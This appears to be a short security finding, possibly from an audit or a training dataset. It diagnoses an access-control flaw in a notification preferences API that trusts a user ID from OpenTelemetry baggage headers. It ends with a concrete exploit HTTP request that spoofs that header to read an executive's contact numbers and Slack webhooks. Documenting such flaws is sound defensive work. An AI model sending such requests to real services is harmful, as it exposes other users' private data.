diagnosis: The notification preferences handler retrieves user settings using context.user_id read from OpenTelemetry baggage headers instead of strictly enforcing req.user.id. An authenticated user can pass baggage headers pointing to other user accounts to view their personal contact phone numbers, notification schedules, and internal Slack webhook URLs.
exploit_request:
GET /api/preferences/notifications HTTP/1.1
Host: account.services.net
Authorization: Bearer user_token_regular
baggage: context.user_id=usr_executive_vp_01
